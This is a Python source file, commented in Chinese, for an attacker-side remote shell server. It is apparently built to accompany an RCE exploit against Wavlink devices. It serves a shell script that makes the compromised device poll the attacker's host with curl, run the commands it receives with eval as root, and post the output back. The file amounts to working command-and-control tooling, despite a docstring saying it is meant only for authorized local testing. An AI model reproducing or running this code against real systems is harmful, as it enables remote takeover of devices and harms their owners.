#!/usr/bin/env python3
"""
Curl Polling Shell Server (攻击端) — 两阶段投递版
===================================================
配合 wavlink_rce_exploit.py --revshell 使用。

工作原理 (两阶段):
  Stage 1: exploit spray 让设备执行 curl -s IP:PORT -o /tmp/r
           → 本服务器 GET / 返回 shell 脚本到 /tmp/r
  Stage 2: exploit spray 让设备执行 sh /tmp/r
           → 脚本开始循环: GET /cmd 取命令 → eval → POST /out 返回输出

使用:
  python curl_shell_server.py [PORT]     # 默认 4444
  # 或指定 LHOST (设备要连回的 IP, 写进下发脚本):
  python curl_shell_server.py [PORT] [LHOST]

  然后在另一个终端运行 exploit:
  python wavlink_rce_exploit.py --target TARGET --sp SP --revshell --lhost LHOST --lport PORT

  QEMU 测试: --lhost 10.0.2.2 (QEMU SLIRP 网关 = 宿主机)

此项目只允许也只能在本地运行，用于授权安全测试。
"""

import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

cmd_ready = threading.Event()
cmd_value = ""
connected = False
script_served = False


def make_shell_script(lhost, lport):
    return f"""#!/bin/sh
while true; do
  curl -s {lhost}:{lport}/cmd -o /tmp/gc
  c=$(cat /tmp/gc)
  [ -z "$c" ] && sleep 1 && continue
  [ "$c" = "exit" ] && break
  o=$(eval "$c" 2>&1)
  curl -s -d "$o" {lhost}:{lport}/out
done
"""


class ShellHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global connected, script_served

        if self.path == "/cmd":
            if not connected:
                connected = True
                print("\n[+] Shell connected! (uid=0 root)")
                print("[*] Type commands below. 'exit' to quit.\n")

            if cmd_ready.is_set():
                c = cmd_value
                cmd_ready.clear()
            else:
                c = ""

            self.send_response(200)
            self.send_header("Content-Length", str(len(c)))
            self.end_headers()
            self.wfile.write(c.encode())
        else:
            body = self.server.shell_script.encode()
            if not script_served:
                script_served = True
                print(f"[*] Shell script served ({len(body)}B)")
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    def do_POST(self):
        size = int(self.headers.get("Content-Length", 0))
        if size > 0:
            data = self.rfile.read(size).decode("utf-8", "replace")
            sys.stdout.write(data)
            if not data.endswith("\n"):
                sys.stdout.write("\n")
            sys.stdout.flush()

        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, format, *args):
        pass


def input_loop():
    global cmd_value
    while True:
        try:
            c = input("root@target# ")
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Sending exit...")
            cmd_value = "exit"
            cmd_ready.set()
            time.sleep(2)
            import os
            os._exit(0)

        cmd_value = c
        cmd_ready.set()
        time.sleep(0.5)


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    lhost = sys.argv[2] if len(sys.argv) > 2 else "10.0.2.2"

    shell_script = make_shell_script(lhost, port)

    print("=" * 50)
    print("Curl Polling Shell Server (两阶段)")
    print("=" * 50)
    print(f"  Listen:  0.0.0.0:{port}")
    print(f"  LHOST:   {lhost}")
    print(f"  Script:  {len(shell_script)}B")
    print()
    print(f"  GET /     → 返回 shell 脚本 (Stage 1)")
    print(f"  GET /cmd  → 返回下一条命令")
    print(f"  POST /out → 接收命令输出")
    print()
    print(f"  等待 exploit 投递...")
    print()

    t = threading.Thread(target=input_loop, daemon=True)
    t.start()

    server = HTTPServer(("0.0.0.0", port), ShellHandler)
    server.shell_script = shell_script
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")


if __name__ == "__main__":
    main()
